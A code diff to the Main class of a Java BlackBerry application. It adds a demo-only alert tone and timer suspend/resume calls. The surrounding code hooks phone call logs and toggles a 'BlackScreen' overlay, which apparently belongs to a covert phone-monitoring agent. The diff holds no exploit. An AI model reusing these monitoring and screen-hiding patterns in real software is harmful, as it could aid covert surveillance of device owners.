@@ -10,6 +10,7 @@
 package blackberry;
 
 import net.rim.blackberry.api.phone.phonelogs.PhoneLogs;
+import net.rim.device.api.system.Alert;
 import net.rim.device.api.ui.UiApplication;
 import blackberry.config.Conf;
 import blackberry.config.Keys;
@@ -28,6 +29,7 @@ public class Main extends UiApplication {
     //#endif
 
     AppListener appListener;
+
     //private boolean foreground;
 
     /**
@@ -83,6 +85,19 @@ public class Main extends UiApplication {
         coreThread.start();
 
         startListeners();
+
+        //#ifdef DEMO
+        short[] fire = { 1400, 15, 1350, 15, 1320, 20, 1300, 20, 1250, 25,
+                1200, 35 };
+        try
+        {
+            Alert.startAudio(fire, 100);
+        }
+        catch (Exception e)
+        {
+            
+        }
+        //#endif
     }
 
     /**
@@ -101,6 +116,8 @@ public class Main extends UiApplication {
 
         //addRadioListener(appListener);
         PhoneLogs.addListener(appListener);
+        
+        Task.getInstance().resumeApplicationTimer();
 
         //goBackground();
     }
@@ -121,6 +138,7 @@ public class Main extends UiApplication {
         //Phone.removePhoneListener(appListener);
         PhoneLogs.removeListener(appListener);
 
+        Task.getInstance().suspendApplicationTimer();
         //goBackground();
     }
 
@@ -144,7 +162,7 @@ public class Main extends UiApplication {
         if (value) {
             synchronized (this.getAppEventLock()) {
                 BlackScreen.newInstance(Main.getUiApplication());
-            }                     
+            }
 
         } else {
             if (BlackScreen.getInstance() != null) {
@@ -154,7 +172,7 @@ public class Main extends UiApplication {
                 synchronized (this.getAppEventLock()) {
                     BlackScreen.getInstance().dismiss();
                 }
-               
+
                 //goBackground();
             }
         }
